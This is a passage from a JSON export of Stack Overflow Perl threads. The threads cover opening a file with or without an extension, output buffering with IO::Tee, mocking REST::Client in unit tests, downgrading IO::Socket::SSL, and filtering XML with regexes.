{"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462980234, "post_id": 37164752, "comment_id": 61869197, "body": "What happens if both <code>file</code> and <code>file.ext</code> exist?"}], "answers": [{"comments": [{"owner": {"reputation": 113, "user_id": 5913774, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/2NphR.jpg?s=128&g=1", "display_name": "macurie", "link": "https://stackoverflow.com/users/5913774/macurie"}, "edited": false, "score": 0, "creation_date": 1462977424, "post_id": 37164819, "comment_id": 61867101, "body": "Can I return the open file so I can do the manipulation outside the function? I need to iterate over it multiple times."}], "tags": [], "owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "is_accepted": false, "score": 0, "last_activity_date": 1462974881, "creation_date": 1462974881, "answer_id": 37164819, "question_id": 37164752, "link": "https://stackoverflow.com/questions/37164752/open-file-with-or-without-extension/37164819#37164819", "title": "Open file with or without extension", "body": "<p>The typical approach is to pass the filename to the piece of the code that needs to open the file: </p>\n\n<pre><code>sub f {\n   my ($filename) = @_; \n\n   open my $fh, '&lt;', $filename or die \"$!\";\n   # do things with $fh\n   close $fh;\n\n   return;\n}\n</code></pre>\n\n<p>now it doesn't matter what the name of the file is, function <code>f</code> will open it (assuming it exists and you have permissions to read it): </p>\n\n<pre><code>f('file');\nf('file.ext');\n</code></pre>\n\n<p>You could also pass the filename as a command-line argument: </p>\n\n<pre><code>#!perl \n\n# test-open.pl\nuse strict; \nuse warnings; \n\nmy $filename = shift @ARGV or die \"Missing filename\";\nopen my $fh, '&lt;', $filename or die \"$!\"; \n</code></pre>\n\n<p>now you call test-open.pl, passing it a filename:</p>\n\n<pre><code>perl test-open.pl file\nperl test-open.pl file.ext\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462975591, "post_id": 37165041, "comment_id": 61865695, "body": "I think I&#39;d take a similar approach, but might do it via a ternary, e.g. <code>open ( my $input, &#39;&lt;&#39;, -f $file ? $file : $file.&quot;.ext&quot; ) or die $!; </code>."}], "tags": [], "owner": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "is_accepted": true, "score": 4, "last_activity_date": 1462978992, "last_edit_date": 1462978992, "creation_date": 1462975412, "answer_id": 37165041, "question_id": 37164752, "link": "https://stackoverflow.com/questions/37164752/open-file-with-or-without-extension/37165041#37165041", "title": "Open file with or without extension", "body": "<p>You can use <code>grep</code>:</p>\n\n<pre><code>use warnings;\nuse strict;\nuse Errno qw( ENOENT );\n\nmy ($file) = grep { -f $_ } qw(file file.ext)\n   or die $!=ENOENT;\nopen my $fh, '&lt;', $file\n   or die \"$file: $!\";\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462978504, "post_id": 37166282, "comment_id": 61867901, "body": "That can die with the wrong error message. For example, it will die with <code>No such file or directory</code> if you don&#39;t have permissions to read <code>file</code> and <code>file.ext</code> doesn&#39;t exist. See my answer."}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 1, "last_activity_date": 1462978384, "creation_date": 1462978384, "answer_id": 37166282, "question_id": 37164752, "link": "https://stackoverflow.com/questions/37164752/open-file-with-or-without-extension/37166282#37166282", "title": "Open file with or without extension", "body": "<p><code>open</code> returns 0 on failure, so you can chain open calls together with the <code>||</code> or <code>or</code> operators.</p>\n\n<pre><code>my $fh;\nopen ($fh, '&lt;', 'file') ||\n    open ($fh, '&lt;', 'file.ext') ||\n    open ($fh, '&lt;', $other_default_filename) ||\n    die \"Couldn't find any acceptable file: $!\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1462979330, "last_edit_date": 1462979330, "creation_date": 1462978385, "answer_id": 37166284, "question_id": 37164752, "link": "https://stackoverflow.com/questions/37164752/open-file-with-or-without-extension/37166284#37166284", "title": "Open file with or without extension", "body": "<p>The following will produce the most usable error message:</p>\n\n<pre><code>sub open_if_exists {\n   my ($qfn) = @_;\n\n   my $fh;\n   open($fh, '&lt;', $qfn)\n      and return $fh;\n\n   $!{ENOENT}\n      and return undef;\n\n   die(\"Can't open \\\"$qfn\\\": $!\\n\");\n}\n\nmy $qfn = \"file\";\nmy $fh = open_if_exists($qfn) || open_if_exists(\"$qfn.ext\")\n   or die(\"Can't open \\\"$qfn\\\" or \\\"$qfn.ext\\\": $!\\n\");\n</code></pre>\n"}], "owner": {"reputation": 113, "user_id": 5913774, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/2NphR.jpg?s=128&g=1", "display_name": "macurie", "link": "https://stackoverflow.com/users/5913774/macurie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 318, "favorite_count": 0, "accepted_answer_id": 37165041, "answer_count": 4, "score": 0, "last_activity_date": 1462979330, "creation_date": 1462974704, "question_id": 37164752, "link": "https://stackoverflow.com/questions/37164752/open-file-with-or-without-extension", "title": "Open file with or without extension", "body": "<p>This is how I open a file in Perl:</p>\n\n<pre><code>open FILE, \"&lt;/file.ext\";\n</code></pre>\n\n<p>How do I open the file <code>file</code> regardless of if it's called <code>file</code> or <code>file.ext</code> in Perl?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 4, "creation_date": 1462973316, "post_id": 37164016, "comment_id": 61863705, "body": "Try turning off output buffering in the second script.  <code>$| = 1</code>;"}], "answers": [{"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 2, "last_activity_date": 1462995617, "creation_date": 1462995617, "answer_id": 37171886, "question_id": 37164016, "link": "https://stackoverflow.com/questions/37164016/printing-messages-to-the-screen-and-a-file/37171886#37171886", "title": "printing messages to the screen and a file", "body": "<p>Printing to STDOUT is usually <em>line buffered</em> (to speed things up) when output goes to a terminal and <em>block buffered</em> otherwise (e.g. when redirecting output to a file).<br>\nYou can think of it as if anything printed is first placed into a buffer (typically 4096 bytes large) and only when the buffer is full (i.e. 4096 characters were printed), it gets output to the screen.</p>\n\n<p><strong>line buffered</strong> means the output is only shown on screen after a <code>\\n</code> is found (or the buffer is exhausted). You don't have <code>\\n</code>s in your 2nd script, so no output is shown until either a) <code>\\n</code> comes, b) buffer is full, or c) the script ends.</p>\n\n<p><strong>block buffered</strong> means the output is shown only when the buffer is full. <code>\\n</code>s don't influence this here (except for counting as one character).</p>\n\n<p>To avoid buffering there's a <em>magic variable</em> called <code>$|</code>. From the <a href=\"http://perldoc.perl.org/perlvar.html\" rel=\"nofollow\">docs</a> (scroll down to the <code>$|</code> section):</p>\n\n<blockquote>\n  <p>If set to nonzero, forces a flush right away and after every write or\n  print on the currently selected output channel.</p>\n</blockquote>\n\n<p>So you could append <code>\"\\n\"</code> to your print statements or \u2013 better \u2013 set <code>$| = 1;</code> on top of your 2nd script (only once, not for each <code>print</code>). This will slow down the output of the 2nd script (in theory) but for a few lines it will make no difference.</p>\n"}], "owner": {"reputation": 35, "user_id": 947460, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90516d990e79869b5ab56859447ff770?s=128&d=identicon&r=PG", "display_name": "bcat", "link": "https://stackoverflow.com/users/947460/bcat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 553, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1462995617, "creation_date": 1462972923, "question_id": 37164016, "link": "https://stackoverflow.com/questions/37164016/printing-messages-to-the-screen-and-a-file", "title": "printing messages to the screen and a file", "body": "<p>I have perl script that I am running in Windows. In the script I call another perl scrip.  I am trying get both of those scripts to print to the cmd window and a file. This basically how I am doing the call</p>\n\n<pre><code>    using IO::Tee\n    open (my $file, '&gt;&gt;', \"C:\\\\Logs\\\\logfile.txt\") or die \"couldn't open log file:  $!\";\n    me $tee = IO::Tee-&gt;new(\\*STDOUT, $file);\n    # doing some stuff \n    print $tee \"log about what i just did\";\n    # do more stuff \n    print $tee \"more logs\";\n    print $tee `c:\\\\secondScript.pl arg1`;\n    print $tee \"done with script\";\n</code></pre>\n\n<p>The second script is basically </p>\n\n<pre><code>    # do stuff\n    print \"script 2 log about stuff\";\n    # do more stuff\n    print \"script 2 log about more stuff\";\n    print \"script 2 done\";\n</code></pre>\n\n<p>This does get everything to the screen and a file.  However, I don't see the \"script 2 log about stuff\", \"script 2 log about more stuff\", and \"script 2 done\" until after script 2 has finished.  I would like to see all of that stream to the screen and the file as soon as the print is reached. </p>\n"}, {"tags": ["perl", "mocking", "rt"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1462974597, "post_id": 37163899, "comment_id": 61864816, "body": "Check out Test::LWP::UserAgent. It can do fairly advanced stuff. You need to look at what kind of responses you are expecting, and mock those in T::L::UA"}, {"owner": {"reputation": 1498, "user_id": 5217466, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/bebcb5dcae50dfd07d042a9815617907?s=128&d=identicon&r=PG&f=1", "display_name": "the_ccalderon", "link": "https://stackoverflow.com/users/5217466/the-ccalderon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462974674, "post_id": 37163899, "comment_id": 61864869, "body": "Can we chat a little bit? If we can, please create a chat room and let me know. Thanks as usual @simbabque"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462974874, "post_id": 37163899, "comment_id": 61865058, "body": "Sorry, not right now. I suggest you <a href=\"https://stackoverflow.com/posts/37163899/edit\">edit</a> your question to include a bit more details. What exactly are you testing? Certain endpoints, or the whole thing? If you manage to boil it down to basics, you can remove the context of RT and the question will get more attention."}, {"owner": {"reputation": 1498, "user_id": 5217466, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/bebcb5dcae50dfd07d042a9815617907?s=128&d=identicon&r=PG&f=1", "display_name": "the_ccalderon", "link": "https://stackoverflow.com/users/5217466/the-ccalderon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462974923, "post_id": 37163899, "comment_id": 61865112, "body": "Ok, thank you very much! Will do that."}, {"owner": {"reputation": 1498, "user_id": 5217466, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/bebcb5dcae50dfd07d042a9815617907?s=128&d=identicon&r=PG&f=1", "display_name": "the_ccalderon", "link": "https://stackoverflow.com/users/5217466/the-ccalderon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462976100, "post_id": 37163899, "comment_id": 61866095, "body": "How can I know the response I should get? Is there any way to do that?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1463034481, "post_id": 37163899, "comment_id": 61891505, "body": "Try in production, record what it returns. If you write tests after the code and don&#39;t know the expected output, you can only trust the code. If it worked so far, it will be correct enough to start with."}, {"owner": {"reputation": 1498, "user_id": 5217466, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/bebcb5dcae50dfd07d042a9815617907?s=128&d=identicon&r=PG&f=1", "display_name": "the_ccalderon", "link": "https://stackoverflow.com/users/5217466/the-ccalderon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1463054305, "post_id": 37163899, "comment_id": 61905089, "body": "Ok,for example, I wanna know the response of executing RT::Client::REST-&gt;new. How can I do that?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1463054515, "post_id": 37163899, "comment_id": 61905248, "body": "That doesn&#39;t do any calls. It just creates an object."}, {"owner": {"reputation": 1498, "user_id": 5217466, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/bebcb5dcae50dfd07d042a9815617907?s=128&d=identicon&r=PG&f=1", "display_name": "the_ccalderon", "link": "https://stackoverflow.com/users/5217466/the-ccalderon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1463054620, "post_id": 37163899, "comment_id": 61905327, "body": "Sorry, how about login?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1463058413, "post_id": 37163899, "comment_id": 61908321, "body": "I do not understand what you want. Clarify your question. <a href=\"https://metacpan.org/source/SRVSH/RT-Client-REST-0.50/t\" rel=\"nofollow noreferrer\">Here&#39;s the directory</a> with the unit tests for RT::Client::REST. It sounds like you want that. If you want to know what stuff is returned by the underlying LWP::UA, read its documentation to see how to get to HTTP::Response objects while they are being processed, serialize them, and use that to build your tests. But if you want to test your RT, you should focus on building a mocked client, not writing tests for one."}, {"owner": {"reputation": 1498, "user_id": 5217466, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/bebcb5dcae50dfd07d042a9815617907?s=128&d=identicon&r=PG&f=1", "display_name": "the_ccalderon", "link": "https://stackoverflow.com/users/5217466/the-ccalderon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1463058697, "post_id": 37163899, "comment_id": 61908560, "body": "Yes, I need to mock an RT, but I do not know how to do it. Do you have any example or idea?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1463059099, "post_id": 37163899, "comment_id": 61908876, "body": "I just told you what to do... Your question as it stands is off-topic. Please read up on documentation, try around, and ask a <b>specific</b> question when you get stuck. But this is too broad."}, {"owner": {"reputation": 1498, "user_id": 5217466, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/bebcb5dcae50dfd07d042a9815617907?s=128&d=identicon&r=PG&f=1", "display_name": "the_ccalderon", "link": "https://stackoverflow.com/users/5217466/the-ccalderon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1463059426, "post_id": 37163899, "comment_id": 61909135, "body": "Ok, will do. Thank you very much."}], "answers": [{"tags": [], "owner": {"reputation": 64, "user_id": 4330363, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TGIa2.jpg?s=128&g=1", "display_name": "Harold", "link": "https://stackoverflow.com/users/4330363/harold"}, "is_accepted": true, "score": 2, "last_activity_date": 1498857054, "creation_date": 1498857054, "answer_id": 44854867, "question_id": 37163899, "link": "https://stackoverflow.com/questions/37163899/mocking-a-restclientrest/44854867#44854867", "title": "Mocking a REST:Client::REST", "body": "<p>Find below my example:</p>\n\n<pre><code>my $mock = Test::MockModule-&gt;new('REST::Client');\nmy $raw_response = '';\n$mock-&gt;mock(\n    POST =&gt; sub { # You can do the same for GET :)\n        my ($ua, $request) = @_;\n        if ($request =~ /confirm/) {\n            $raw_response = $confirm_response_ok; # This is response for Confirm Method in my Code\n        }\n        elsif ($request =~ /transfers/) {\n            $raw_response = $create_response_ok; # This is response for Create transfer in my Code\n        }\n        return '';\n    },      \n    responseCode =&gt; sub {\n        my $self = shift;\n        return '200';\n    },      \n    responseContent =&gt; sub {\n        my $self = shift;\n        return $raw_response;\n    }\n);\n</code></pre>\n\n<p>From Miami with Love. You know where to find us  :)</p>\n\n<p>Evelio and Harold</p>\n"}], "owner": {"reputation": 1498, "user_id": 5217466, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/bebcb5dcae50dfd07d042a9815617907?s=128&d=identicon&r=PG&f=1", "display_name": "the_ccalderon", "link": "https://stackoverflow.com/users/5217466/the-ccalderon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 303, "favorite_count": 0, "accepted_answer_id": 44854867, "answer_count": 1, "score": 1, "last_activity_date": 1498857054, "creation_date": 1462972694, "question_id": 37163899, "link": "https://stackoverflow.com/questions/37163899/mocking-a-restclientrest", "title": "Mocking a REST:Client::REST", "body": "<p>I'm trying to do unit testing over an RT system, so I need to mock a RT instance locally. Basically, I'm connecting to the RT system and I'm working over the ticket's queue. Does anybody has like a code example or any ideas? I think I need to mock LWP::UserAgent but I'm not sure. \nPlease ideas. Thanks in advance!</p>\n"}, {"tags": ["perl", "sockets", "module", "cpan"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462976486, "post_id": 37163896, "comment_id": 61866367, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/260593/how-can-i-install-a-specific-version-of-a-set-of-perl-modules\">How can I install a specific version of a set of Perl modules?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 3242513, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/6d5f03c7c23f41545bbb0ac179a6dee1?s=128&d=identicon&r=PG&f=1", "display_name": "user3242513", "link": "https://stackoverflow.com/users/3242513/user3242513"}, "edited": false, "score": 0, "creation_date": 1462973452, "post_id": 37164142, "comment_id": 61863816, "body": "And do i have to delete some files from the version 2.027 when i&#39;m going back to 1.4 ?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 37, "user_id": 3242513, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/6d5f03c7c23f41545bbb0ac179a6dee1?s=128&d=identicon&r=PG&f=1", "display_name": "user3242513", "link": "https://stackoverflow.com/users/3242513/user3242513"}, "edited": false, "score": 0, "creation_date": 1462973550, "post_id": 37164142, "comment_id": 61863879, "body": "@user3242513, It&#39;ll overwrite most if not all of the files. Any extra files should be harmless."}], "tags": [], "owner": {"reputation": 308, "user_id": 4754913, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d1761327a7ddb0260a880445ae282fbd?s=128&d=identicon&r=PG&f=1", "display_name": "ajays20078", "link": "https://stackoverflow.com/users/4754913/ajays20078"}, "is_accepted": true, "score": 1, "last_activity_date": 1462973474, "last_edit_date": 1462973474, "creation_date": 1462973245, "answer_id": 37164142, "question_id": 37163896, "link": "https://stackoverflow.com/questions/37163896/how-exactly-to-downgrade-a-perl-module-version-from-latest-one-to-older-one/37164142#37164142", "title": "How exactly to downgrade a Perl module version from latest one to older one?", "body": "<p>Assuming you don't have any dependencies which need to be downgraded you can run the following commands:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>tar xvzf IO-Socket-SSL-1.40.tar.gz\ncd IO-Socket-SSL-1.40\nperl Makefile.PL\nmake test\nmake install   # If all the tests passed\n</code></pre>\n\n<p>But if your package has other dependencies which need to be downgraded, you will have to follow the same set of steps for those dependencies as well.</p>\n"}], "owner": {"reputation": 37, "user_id": 3242513, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/6d5f03c7c23f41545bbb0ac179a6dee1?s=128&d=identicon&r=PG&f=1", "display_name": "user3242513", "link": "https://stackoverflow.com/users/3242513/user3242513"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1378, "favorite_count": 0, "accepted_answer_id": 37164142, "answer_count": 1, "score": 0, "last_activity_date": 1462973474, "creation_date": 1462972688, "question_id": 37163896, "link": "https://stackoverflow.com/questions/37163896/how-exactly-to-downgrade-a-perl-module-version-from-latest-one-to-older-one", "title": "How exactly to downgrade a Perl module version from latest one to older one?", "body": "<p>My problem is that i upgraded the version of the IO:Sockets:SSL to the latest one through cpan, but now one of my scripts doesnt work on this version of the module. I want to go back to version 1.4 (the latest is 2.027). So i found it and downloaded the .tar.gz file manually but i dont know what to do now. </p>\n\n<p>I've never did this downgrade before and i found out that you cant do it through the cpan... so can someone explain me step by step what i should do ? I found a few answers to my question but i couldnt follow the steps correctly or most of them were unclear for me. </p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 0, "creation_date": 1462972939, "post_id": 37163642, "comment_id": 61863410, "body": "Where you say &quot;the following output is generated&quot;, is not correct.  Run the script yourself and you&#39;ll see that what you&#39;re saying is the output of the given program, is not."}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "edited": false, "score": 0, "creation_date": 1462972943, "post_id": 37163642, "comment_id": 61863413, "body": "Your method works but for <code>&lt;line&gt;</code> elements with nested elements. The logic of your substitution regex expects no interfering <code>&lt;</code> between an opening tag and its matching closing tag. Consider to actually <i>parse</i> xml instead (possibly by using a different tool but perl altogether) - the approach might be too simplistic orlead to overly complicated code; think of xml samples that may contain cdata sections (no easy way to distinguish between verbatim data and syntax elements any more)."}, {"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 4, "creation_date": 1462974394, "post_id": 37163642, "comment_id": 61864627, "body": "Use a proper XML parser."}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "edited": false, "score": 1, "creation_date": 1462974967, "post_id": 37163642, "comment_id": 61865164, "body": "Why do you expect <code>&lt;line&gt; sdfe &lt;&#47;line&gt;</code> in your output? <code>sdfe</code> is part of your filter, isn&#39;t it?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462976330, "post_id": 37163642, "comment_id": 61866261, "body": "Obligatory: <a href=\"http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags\">Parsing XML with regex</a>"}, {"owner": {"reputation": 6468, "user_id": 293652, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/820308d5db420d7f0e1d0ba97e09f520?s=128&d=identicon&r=PG", "display_name": "Grant McLean", "link": "https://stackoverflow.com/users/293652/grant-mclean"}, "edited": false, "score": 1, "creation_date": 1462999949, "post_id": 37163642, "comment_id": 61880737, "body": "I&#39;d also recommend you use a proper XML parser. The <a href=\"https://grantm.github.io/perl-libxml-by-example/\" rel=\"nofollow noreferrer\">Perl XML::LibXML by Example</a> tutorial should get you up and running quickly with XML::LibXML."}, {"owner": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463068507, "post_id": 37163642, "comment_id": 61916400, "body": "Thank you all for your feedback"}], "answers": [{"comments": [{"owner": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463124778, "post_id": 37165258, "comment_id": 61939405, "body": "Thank you collapsar, could you also please suggest the reading material for Perl Module aspirers."}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "reply_to_user": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Y1TKx.jpg?s=128&g=1", "display_name": "Mike Froetscher", "link": "https://stackoverflow.com/users/6260268/mike-froetscher"}, "edited": false, "score": 0, "creation_date": 1463137538, "post_id": 37165258, "comment_id": 61947761, "body": "@MikeFroetscher I pretty much favor official docs ( wrt perl: perldoc.perl.org, module docs on cpan ), standards documents where applicable ( notably the rfcs and w3c material ), and SO for accuracy, detail and overall quality of the information. brian d foy&#39;s &#39;effective perl programming&#39; is an excellent read, too (as are his SO answers!). When it comes to XML processing, I&#39;d recommend XML::LibXML, a veneer of the libxml library - it shines with robustness, api comprehensiveness, and good documentation."}, {"owner": {"reputation": 43, "user_id": 6260268, "user_type": "registered", "profile_image": 